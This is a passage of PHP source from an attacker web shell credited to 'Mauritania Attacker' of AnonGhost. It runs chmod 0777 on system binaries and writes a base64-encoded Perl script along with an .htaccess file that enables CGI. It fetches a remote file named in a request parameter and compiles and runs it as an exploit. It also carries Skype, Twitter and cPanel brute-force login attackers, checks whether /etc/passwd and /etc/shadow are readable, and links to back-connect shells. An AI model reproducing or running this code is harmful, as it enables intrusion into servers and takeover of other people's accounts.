chmod("ls" , 0777);
chmod("chmod" , 0777);
chmod("uname" , 0777);
chmod("rm" , 0777);
chmod("su" , 0777);
chmod("tail" , 0777);
chmod("Ptouch" , 0777);
chmod("who" , 0777);
chmod("gcc" , 0777);
chmod("tar" , 0777);
chmod("du" , 0777);
chmod("dir" , 0777);
chmod("wget" , 0777);
chmod("date" , 0777);
chmod("gzip" , 0777);
chmod("sh" , 0777);

//shell_exec
shell_exec('unzip ghost.zip');

chmod("id" , 0777);
chmod("gunzip" , 0777);
chmod("pwd" , 0777);
chmod("ln" , 0777);
chmod("ls" , 0777);
chmod("chmod" , 0777);
chmod("uname" , 0777);
chmod("rm" , 0777);
chmod("su" , 0777);
chmod("tail" , 0777);
chmod("Ptouch" , 0777);
chmod("who" , 0777);
chmod("gcc" , 0777);
chmod("tar" , 0777);
chmod("du" , 0777);
chmod("dir" , 0777);
chmod("wget" , 0777);
chmod("date" , 0777);
chmod("gzip" , 0777);
chmod("sh" , 0777);

//exec
exec('unzip ghost.zip');

chmod("id" , 0777);
chmod("gunzip" , 0777);
chmod("pwd" , 0777);
chmod("ln" , 0777);
chmod("ls" , 0777);
chmod("chmod" , 0777);
chmod("uname" , 0777);
chmod("rm" , 0777);
chmod("su" , 0777);
chmod("tail" , 0777);
chmod("Ptouch" , 0777);
chmod("who" , 0777);
chmod("gcc" , 0777);
chmod("tar" , 0777);
chmod("du" , 0777);
chmod("dir" , 0777);
chmod("wget" , 0777);
chmod("date" , 0777);
chmod("gzip" , 0777);
chmod("sh" , 0777);

//proc_open
proc_open('unzip ghost.zip');

chmod("id" , 0777);
chmod("gunzip" , 0777);
chmod("pwd" , 0777);
chmod("ln" , 0777);
chmod("ls" , 0777);
chmod("chmod" , 0777);
chmod("uname" , 0777);
chmod("rm" , 0777);
chmod("su" , 0777);
chmod("tail" , 0777);
chmod("Ptouch" , 0777);
chmod("who" , 0777);
chmod("gcc" , 0777);
chmod("tar" , 0777);
chmod("du" , 0777);
chmod("dir" , 0777);
chmod("wget" , 0777);
chmod("date" , 0777);
chmod("gzip" , 0777);
chmod("sh" , 0777);

sleep(3);

echo "<p><font color='007700' face='Tahoma, Geneva, sans-serif' style='font-size: 10pt'>Loading Perl Functions.... </font> </p>";
//chmod.pl generate
$shellw0rm = 'eyANCnN5c3RlbSgidW56aXAgZ2hvc3QuemlwIik7DQpzeXN0ZW0oImNobW9kIDc3NyBpZCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZ3VuemlwIik7DQpzeXN0ZW0oImNobW9kIDc3NyBwd2QiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGxuIik7DQpzeXN0ZW0oImNobW9kIDc3NyBscyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcHdkIik7DQpzeXN0ZW0oImNobW9kIDc3NyBjaG1vZCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgdW5hbWUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHJtIik7DQpzeXN0ZW0oImNobW9kIDc3NyBjYXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHN1Iik7DQpzeXN0ZW0oImNobW9kIDc3NyB0YWlsIik7DQpzeXN0ZW0oImNobW9kIDc3NyB0b3VjaCIpOw0Kc3lzdGVtKCJjaG1vZCA3Nzcgd2hvIik7DQpzeXN0ZW0oImNobW9kIDc3NyBnY2MiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHJtIik7DQpzeXN0ZW0oImNobW9kIDc3NyB0YXIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGR1Iik7DQpzeXN0ZW0oImNobW9kIDc3NyBkaXIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHdnZXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGRhdGUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGd6aXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHNoIik7DQp9';
$chmoderr = fopen("chmod.pl" ,"w+");
$write = fwrite ($chmoderr ,base64_decode($shellw0rm));
if($write){
echo "<p><font color='007700' face='Tahoma, Geneva, sans-serif' style='font-size: 10pt'>Perl Modules Uploaded Successfully</font></p><br>";
fclose($chmoderr);
chmod("chmod.pl",0755);


//Extracting htaccess to enable perl handler and type all depends on the server :D
$htaccess = 'T3B0aW9ucyBJbmNsdWRlcyBJbmNsdWRlc05PRVhFQyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ0KDQpBZGRUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtY2dpIC5wbA0KQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAucGwNCg0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5wbA0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5wbA==';
$lol = fopen(".htaccess" ,"w+");
$dwrite = fwrite ($lol ,base64_decode($htaccess));
fclose($chmoderr);

sleep(2);

//unzip with perl , if php can't do unzip perl maybe can 
echo "<p><b><font color='009900' face='Tahoma, Geneva, sans-serif' style='font-size: 10pt'>Unzipping Functions with Perl </font></b></p><br>";

system('perl chmod.pl');
passthru('perl chmod.pl');
shell_exec('perl chmod.pl');
exec('perl chmod.pl');
proc_open('perl chmod.pl');
echo"</td></tr></table>";
}
}
}

if(isset($_GET['action']) && $_GET['action'] == 'iplookdom'){

     echo "<center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Ip Lookup Reverse Domain By Mauritania Attacker</span></center>
";
echo "<center><img border='0' src='http://www.serveu.net/images/stories/geolocation.png' width=\"200\" height=\"200\" style='margin-top:10px'></center><div id=result>";
echo "<center><br><form><input type='text' size='60' value='yahoo.com' name='ghost' /><input type='hidden' name='action' value='iplookdom'> &nbsp;<input type='submit' value='&nbsp;&check;&nbsp;'></form></center>";
if(isset($_GET["ghost"]))
{
$site = $_GET["ghost"];
$ghost = "http://domains.yougetsignal.com/domains.php";

//Curl Function
$ch = curl_init($ghost);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$site&ket=");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
$resp = curl_exec($ch);
$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
$array = explode(",,", $resp);
unset($array[0]);
echo "<table style='margin: 0 auto'>";
foreach($array as $lnk)
{
    print "<tr><td><a  style=\"color:#0f0;font-weight:bold;\" href='$lnk' target=_blank>$lnk</a></td></tr>";
}
echo "</table>";
curl_close($ch);
}


}
if(isset($_GET['action']) && $_GET['action'] == 'srvrinformations'){
echo '<center><b class="conte">
<a href="?action=exgz">Bypass Server Functions</a> -
<a href="?action=tespr">Test Permission</a> -
<a href="?action=srvrinformations">Server Informations</a>  </center>
</b>';
echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Server Security Informations</span><center><br>";
echo "<center><div class='tmpe'>
<table align='center' width='50%'><td><font color='#007700'>Kernel Version</font></td><td>";echo php_uname();
echo "<tr><td><font color='#007700'>Web Server</font></td><td>";echo $_SERVER["SERVER_SOFTWARE"];
echo "<tr><td><font color='#007700'>PHP Version</font></td><td>";echo phpversion(); echo " on "; echo php_sapi_name();
echo "<tr><td><font color='#007700'>Current User</font></td><td>";echo get_current_user();
echo "<tr><td><font color='#007700'>User ID</font></td><td>";echo getmyuid();
echo "<tr><td><font color='#007700'>Group</font></td><td>";echo getmygid();
echo "<tr><td><font color='#007700'>Cwd </font></td><td>";echo getcwd();
echo "<tr><td><font color='#007700'>Admin Server</font></td><td>";echo $_SERVER['SERVER_ADMIN'];
echo "<tr><td><font color='#007700'>Server Port</font></td><td>";echo $_SERVER['SERVER_PORT'];
echo "<tr><td><font color='#007700'>Server IP</font></td><td>";echo $serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
echo "<tr><td><font color='#007700'>Client IP</font></td><td>";echo $_SERVER['REMOTE_ADDR'];
echo "<tr><td><font color='#007700'>cURL support</font></td><td>";echo function_exists('curl_version')?'Enabled':'No';
echo "<tr><td><font color='#007700'>Readable /etc/passwd</font></td><td>";echo @is_readable('/etc/passwd')?"Readable <a href='?action=moco'> [View]</a>":"Not Readable";
echo "<tr><td><font color='#007700'>Readable /etc/shadow</font></td><td>";echo @is_readable('/etc/shadow')?"Readable":"Not Readable";
$base = (ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON <font color='#007700'>secure</font>":"OFF <font color='#007700'>not secure</font>";
echo "<tr><td><font color='#007700'>Open Base Dir</font></td><td><font class=txt>" . $base . "</font>";
echo "</table></div></center><br>";
}


if(isset($_GET['action']) && $_GET['action'] == 'tespr'){
echo '<center><b class="conte">
<a href="?action=exgz">Bypass Server Functions</a> -
<a href="?action=tespr">Test Permission</a> -
<a href="?action=srvrinformations">Server Informations</a>  </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Test Permission</span><center><br>';

echo '<center><table style="border:1px solid #007700;">';
echo '<tr>';
if(ini_get('id') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;id:&nbsp;</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;id:&nbsp;</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('gunzip') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| gunzip:&nbsp;</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| gunzip:&nbsp;</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('pwd') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| pwd:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| pwd:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('ln') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| ln:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| ln:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('ls') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| ls:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| ls:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('chmod') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| chmod:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| chmod:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
echo '</tr><tr>';
if(ini_get('uname') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;uname:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;uname:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('rm') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| rm:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| rm:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('su') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| su:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| su:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}

if(ini_get('tail') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| tail:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| tail:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('Ptouch') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| Ptouch:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| Ptouch:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('who') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| who:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| who:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
echo '</tr><tr>';
if(ini_get('gcc') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp; gcc:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp; gcc:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('tar') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| tar:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| tar:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('du') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| du:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| du:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('dir') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| dir:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| dir:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('wget') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| wget:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| wget:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('date') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| date:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| date:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
echo '</tr><tr>';

if(ini_get('gzip') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp; gzip:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp; gzip:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('sh') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| sh:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| sh:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
echo '</tr>';
echo '</table></center>';

}



if(isset($_GET['action']) && $_GET['action'] == 'exploit'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Exploit</span><center>';
?><?php
}

if(isset($_GET['exp_url'])){
echo '<center>';
if(function_exists("wget")){
wget($_GET['exp_url']);
echo $_GET['exp_url'].' got in here';
if(function_exists("system")){

if(isset($_GET['run'])){
$run = $_GET['run'];
if($run = 'c++ | .cpp'){
system("gcc -o exploit ".$_GET['exp_url'].";chmod +x exploit;./exploit;");
}
if($run = 'perl | .pl'){
}
if($run = 'python | .py'){
}
if($run = 'ruby | .rb'){
}


}


}
else{
echo 'System command disabled';
}
}
else{
echo('wget disabled');
}
echo '</center>';
}
if(isset($_GET['action']) && $_GET['action'] == 'skybru'){
echo '<center><b class="conte">
<a href="?action=skybru">Skype Brute Force</a> -
<a href="?action=cpbru">Cpanel Brute Force</a> -
<a href="?action=jmbru">Joomla Brute Force</a> -
<a href="?action=wpbru">Wordpress Brute Force</a> -
<a href="?action=twbru">Twitter Brute Force</a> -
<a href="?action=ghbru">Gmail & Hotmail Brute Force</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Skype Brute Force</span><center>';
ob_start();
@set_time_limit(0);
#Skype BruteForce Developped By noname-haxor from AnonGhost Team (Thanks To Mauritania Attacker)
#Idea By : Mauritania Attacker


echo "
<center><img src='http://www14.0zz0.com/2014/07/26/11/926953700.png' width='450' height='95' /></center>
</b>
<br></center>
<p dir='ltr' align='center' box-shadow: 0px 0px 4px #007700;>
<textarea cols='34' class='area' rows='14' name='username'>Target Name</textarea> 
<textarea cols='34' class='area' rows='14' name='password'>Password</textarea><br>
<br>
<input type='submit' value='Start BruteForce'><br></p>";
if($_POST['username'] and $_POST['password']){
	#function
	function brute($user,$pass)
	{
$ch = curl_init();      
curl_setopt($ch, CURLOPT_URL, "https://login.skype.com/login");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "username={$user}&password={$pass}");
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/34.0.1847.116"); 
		
$login = curl_exec($ch);
if(eregi("message message_error", $login)){

echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>Not the right one :(  || Username : <font color='red'>$user</font>&nbsp;  Password : <font color='red'>$pass</font></font></p><br><br><br>"; 
}else{
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>You Are Lucky Password Found ! || Username: <font color='#b0b000'>$user</font>&nbsp; Password : <font color='#b0b000'>$pass</font></font></p><br><br><br>";
}
}
	
	$username = explode("
", $_POST['username']);
	$password = explode("
", $_POST['password']);
	
	
	foreach($username as $users) {
		$users = @trim($users);
	foreach($password as $pass) {
		$pass = @trim($pass);
		brute($users,$pass); }}
	
	
	}
}



if(isset($_GET['action']) && $_GET['action'] == 'twbru'){
echo '<center><b class="conte">
<a href="?action=skybru">Skype Brute Force</a> -
<a href="?action=cpbru">Cpanel Brute Force</a> -
<a href="?action=jmbru">Joomla Brute Force</a> -
<a href="?action=wpbru">Wordpress Brute Force</a> -
<a href="?action=twbru">Twitter Brute Force</a> -
<a href="?action=ghbru">Gmail & Hotmail Brute Force</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Twitter Multi-Account BruteForce</span><br>Coded  By Mauritania Attacker</center><br><br>';
echo "<p dir='ltr' align='center'>
<textarea cols='22' class='area' rows='14' name='username'>Username</textarea> 
<textarea cols='22' class='area' rows='14' name='password'>Password</textarea><br><br><input type='submit' value='Attack Now'><br></p><br>";
if($_POST['username'] and $_POST['password']){
	#function
	function brute($user,$pass)
	{
		$ch = curl_init();      
		curl_setopt($ch, CURLOPT_URL, "https://twitter.com/intent/session/");
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "authenticity_token=&session[username_or_email]={$user}&session[password]={$pass}&remember_me=1");
		curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/34.0.1847.116"); #change with your real useragent plz
		
		# cURL - Brute Users & Password
		$login = curl_exec($ch);
		if(eregi("error notice", $login)){
		 
		
			echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : Username : <font color='red'>$user</font>&nbsp; Incorrect Password =====>: <font color='red'>$pass</font></font></p>"; 
		}else{
		echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : [+] CRACKED SUCCESSFULLY [+]Username : <font color='green'>$user</font>&nbsp; GOOD PASSWORD =====>: <font color='green'>$pass</font></font></p>";
		}
	}
	# POSTS
	$username = explode("\n", $_POST['username']);
	$password = explode("\n", $_POST['password']);
	
	# Foreach Users N' Textarea
	foreach($username as $users) {
		$users = @trim($users);
	foreach($password as $pass) {
		$pass = @trim($pass);
		brute($users,$pass); }}
	# cURL
	
	}
	echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>Coded By : Mauritania Attacker</font></p>";
}
if(isset($_GET['action']) && $_GET['action'] == 'cpbru'){
echo '<center><b class="conte">
<a href="?action=skybru">Skype Brute Force</a> -
<a href="?action=cpbru">Cpanel Brute Force</a> -
<a href="?action=jmbru">Joomla Brute Force</a> -
<a href="?action=wpbru">Wordpress Brute Force</a> -
<a href="?action=twbru">Twitter Brute Force</a> -
<a href="?action=ghbru">Gmail & Hotmail Brute Force</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Cpanel Brute Force</span></center><br><br>';
function in($type,$name,$size,$value,$checked=0) 
 {
 $ret = "<input type=".$type." name=".$name." "; if($size != 0) 
 {
 $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\""; if($checked) $ret .= " checked"; return $ret.">"; }
 
class my_sql 
 {
 var $host = 'localhost'; var $port = ''; var $user = ''; var $pass = ''; var $base = ''; var $db = ''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect() 
 {
 switch($this->db) 
 {
 case 'MySQL': if(empty($this->port)) 
 {
 $this->port = '3306'; }
 if(!function_exists('mysql_connect')) return 0; $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass); if(is_resource($this->connection)) return 1; $this->error = @mysql_errno()." : ".@mysql_error(); break; case 'MSSQL': if(empty($this->port)) 
 {
 $this->port = '1433'; }
 if(!function_exists('mssql_connect')) return 0; $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass); if($this->connection) return 1; $this->error = "Can't connect to server"; break; case 'PostgreSQL': if(empty($this->port)) 
 {
 $this->port = '5432'; }
 $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'"; if(!function_exists('pg_connect')) return 0; $this->connection = @pg_connect($str); if(is_resource($this->connection)) return 1; $this->error = @pg_last_error($this->connection); break; case 'Oracle': if(!function_exists('ocilogon')) return 0; $this->connection = @ocilogon($this->user, $this->pass, $this->base); if(is_resource($this->connection)) return 1; $error = @ocierror(); $this->error=$error['message']; break; }
 return 0; }
 function select_db() 
 {
 switch($this->db) 
 {
 case 'MySQL': if(@mysql_select_db($this->base,$this->connection)) return 1; $this->error = @mysql_errno()." : ".@mysql_error(); break; case 'MSSQL': if(@mssql_select_db($this->base,$this->connection)) return 1; $this->error = "Can't select database"; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
 return 0; }
 function query($query) 
 {
 $this->res=$this->error=''; switch($this->db) 
 {
 case 'MySQL': if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))) 
 {
 $this->error = @mysql_error($this->connection); return 0; }
 else if(is_resource($this->res)) 
 {
 return 1; }
 return 2; break; case 'MSSQL': if(false===($this->res=@mssql_query($query,$this->connection))) 
 {
 $this->error = 'Query error'; return 0; }
 else if(@mssql_num_rows($this->res) > 0) 
 {
 return 1; }
 return 2; break; case 'PostgreSQL': if(false===($this->res=@pg_query($this->connection,$query))) 
 {
 $this->error = @pg_last_error($this->connection); return 0; }
 else if(@pg_num_rows($this->res) > 0) 
 {
 return 1; }
 return 2; break; case 'Oracle': if(false===($this->res=@ociparse($this->connection,$query))) 
 {
 $this->error = 'Query parse error'; }
 else 
 {
 if(@ociexecute($this->res)) 
 {
 if(@ocirowcount($this->res) != 0) return 2; return 1; }
 $error = @ocierror(); $this->error=$error['message']; }
 break; }
 return 0; }
 function get_result() 
 {
 $this->rows=array(); $this->columns=array(); $this->num_rows=$this->num_fields=0; switch($this->db) 
 {
 case 'MySQL': $this->num_rows=@mysql_num_rows($this->res); $this->num_fields=@mysql_num_fields($this->res); while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res))); @mysql_free_result($this->res); if($this->num_rows)
 {
$this->columns = @array_keys($this->rows[0]); return 1;}
 break; case 'MSSQL': $this->num_rows=@mssql_num_rows($this->res); $this->num_fields=@mssql_num_fields($this->res); while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res))); @mssql_free_result($this->res); if($this->num_rows)
 {
$this->columns = @array_keys($this->rows[0]); return 1;}
; break; case 'PostgreSQL': $this->num_rows=@pg_num_rows($this->res); $this->num_fields=@pg_num_fields($this->res); while(false !== ($this->rows[] = @pg_fetch_assoc($this->res))); @pg_free_result($this->res); if($this->num_rows)
 {
$this->columns = @array_keys($this->rows[0]); return 1;}
 break; case 'Oracle': $this->num_fields=@ocinumcols($this->res); while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++; @ocifreestatement($this->res); if($this->num_rows)
 {
$this->columns = @array_keys($this->rows[0]); return 1;}
 break; }
 return 0; }
 function dump($table) 
 {
 if(empty($table)) return 0; $this->dump=array(); $this->dump[0] = '##'; $this->dump[1] = '## --------------------------------------- '; $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s"); $this->dump[3] = '## Database: '.$this->base; $this->dump[4] = '##    Table: '.$table; $this->dump[5] = '## --------------------------------------- '; switch($this->db) 
 {
 case 'MySQL': $this->dump[0] = '## MySQL dump'; if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; $this->dump[] = $this->rows[0]['Create Table'].";"; $this->dump[] = '## --------------------------------------- '; if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++) 
 {
 foreach($this->rows[$i] as $k=>$v) 
 {
$this->rows[$i][$k] = @mysql_real_escape_string($v);}
 $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
 break; case 'MSSQL': $this->dump[0] = '## MSSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++) 
 {
 foreach($this->rows[$i] as $k=>$v) 
 {
$this->rows[$i][$k] = @addslashes($v);}
 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
 break; case 'PostgreSQL': $this->dump[0] = '## PostgreSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++) 
 {
